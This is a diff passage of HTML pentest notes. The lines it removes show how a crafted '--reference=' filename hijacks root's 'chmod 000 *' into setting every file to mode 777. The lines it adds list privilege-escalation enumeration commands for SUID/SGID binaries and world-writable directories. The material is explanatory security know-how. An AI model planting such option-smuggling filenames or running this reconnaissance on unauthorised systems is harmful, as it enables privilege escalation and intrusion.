-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
-</pre></div>
-</div>
-<p>Superuser will now try to set mode 000 on all files.</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># chmod 000 *</span>
-</pre></div>
-</div>
-<p>Let&#8217;s check permissions on files...</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span><span class="p">[</span><span class="n">root</span><span class="nd">@defensecode</span> <span class="n">public</span><span class="p">]</span><span class="c1"># ls -al</span>
-<span class="n">total</span> <span class="mi">68</span>
-<span class="n">drwxrwxrwx</span><span class="o">.</span>  <span class="mi">2</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">41</span> <span class="o">.</span>
-<span class="n">drwx</span><span class="o">------.</span> <span class="mi">24</span> <span class="n">user</span> <span class="n">user</span>  <span class="mi">4096</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">18</span><span class="p">:</span><span class="mi">32</span> <span class="o">..</span>
-<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span> <span class="mi">20480</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">19</span><span class="p">:</span><span class="mi">13</span> <span class="n">admin</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">34</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">ado</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">187</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">44</span> <span class="n">db</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">201</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">43</span> <span class="n">download</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">40</span> <span class="o">.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">43</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">35</span> <span class="n">file1</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">56</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">47</span> <span class="n">footer</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">357</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="k">global</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">225</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">37</span> <span class="n">header</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">117</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">36</span> <span class="n">inc</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>   <span class="mi">111</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">index</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--.</span>  <span class="mi">1</span> <span class="n">leon</span> <span class="n">leon</span>     <span class="mi">0</span> <span class="n">Oct</span> <span class="mi">29</span> <span class="mi">00</span><span class="p">:</span><span class="mi">41</span> <span class="o">--</span><span class="n">reference</span><span class="o">=.</span><span class="n">drf</span><span class="o">.</span><span class="n">php</span>
-<span class="o">-</span><span class="n">rwxrwxrwx</span><span class="o">.</span>  <span class="mi">1</span> <span class="n">user</span> <span class="n">user</span>    <span class="mi">94</span> <span class="n">Oct</span> <span class="mi">28</span> <span class="mi">17</span><span class="p">:</span><span class="mi">38</span> <span class="n">script</span><span class="o">.</span><span class="n">php</span>
-</pre></div>
-</div>
-<p>What happened? Instead of 000, all files are now set to mode 777 because of the &#8216;&#8211;reference&#8217; option supplied through file name..Once again,file .drf.php owned by user &#8216;leon&#8217; with mode 777 was used as reference file and since &#8211;reference option is supplied, all files will be set tomode 777. Beside just &#8211;reference option, attacker can also create another file with &#8216;-R&#8217; filename, to change file permissions on files in  all subdirectories recursively.</p>
-</div></blockquote>
 <ul class="simple">
 <li><strong>Tar arbitrary command execution</strong></li>
 </ul>
@@ -976,6 +937,49 @@ Something is not right... What happened? Somebody got drunk here. Superuser trie
 </div>
 </div></blockquote>
 </div></blockquote>
+</div>
+<div class="section" id="privilege-esclation-from-g0tm1lk-blog">
+<h3>Privilege esclation from g0tm1lk blog<a class="headerlink" href="#privilege-esclation-from-g0tm1lk-blog" title="Permalink to this headline">¶</a></h3>
+<ul class="simple">
+<li>What &#8220;Advanced Linux File Permissions&#8221; are used? Sticky bits, SUID &amp; GUID</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span>find / -perm -1000 -type d 2&gt;/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
+find / -perm -g=s -type f 2&gt;/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
+find / -perm -u=s -type f 2&gt;/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.
+
+find / -perm -g=s -o -perm -u=s -type f 2&gt;/dev/null    # SGID or SUID
+for i in `locate -r &quot;bin$&quot;`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2&gt;/dev/null; done    # Looks in &#39;common&#39; places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
+
+# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
+ find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2&gt;/dev/null
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Where can written to and executed from? A few &#8216;common&#8217; places: /tmp, /var/tmp, /dev/shm</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">writable</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>      <span class="c1"># world-writeable folders</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="mi">222</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-writeable folders</span>
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">w</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-writeable folders</span>
+
+<span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">x</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>     <span class="c1"># world-executable folders</span>
+
+<span class="n">find</span> <span class="o">/</span> \<span class="p">(</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">w</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">o</span> <span class="n">x</span> \<span class="p">)</span> <span class="o">-</span><span class="nb">type</span> <span class="n">d</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>   <span class="c1"># world-writeable &amp; executable folders</span>
+</pre></div>
+</div>
+</div></blockquote>
+<ul class="simple">
+<li>Any &#8220;problem&#8221; files? Word-writeable, &#8220;nobody&#8221; files</li>
+</ul>
+<blockquote>
+<div><div class="highlight-default"><div class="highlight"><pre><span></span>find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
+find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
+</pre></div>
+</div>
+</div></blockquote>
+</div>
 </div>
 <div class="section" id="tips-and-tricks">
 <h2>Tips and Tricks<a class="headerlink" href="#tips-and-tricks" title="Permalink to this headline">¶</a></h2>
